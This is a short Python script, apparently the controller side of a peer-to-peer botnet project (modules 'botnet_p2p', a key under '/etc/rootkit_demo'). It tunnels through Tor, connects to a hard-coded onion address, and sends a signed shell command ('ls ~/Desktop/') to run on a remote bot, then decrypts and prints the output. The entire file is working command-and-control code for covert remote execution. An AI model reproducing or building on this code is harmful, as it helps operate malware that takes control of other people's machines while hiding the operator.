 
from botnet_p2p.message import structure_msg, sign_structured_msg
from botnet_p2p.security import decrypt
import socket
import socks


socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
socket.socket = socks.socksocket


with open('/var/lib/tor/hidden_communication/hostname', 'r') as f:
    onion_comm = f.read().strip()

onion_comm2 = "rdq36abjowq3yph3.onion"
onion_comm3 = "p6c6jkxxcpus4kpl.onion"
client_socket = socket.socket()
client_socket.connect((onion_comm2, 50001))

msg_info = {
    "num_anonymizers": 2,
    "onion": onion_comm,
    "msg_type": 2,
    "msg": "ls ~/Desktop/",
}
msg = structure_msg(msg_info)
signed_msg = sign_structured_msg(msg, "/etc/rootkit_demo/private_key")
client_socket.send(signed_msg)

o = client_socket.recv(4096)
out = decrypt(o, "/etc/rootkit_demo/private_key")
print(out)

client_socket.close()
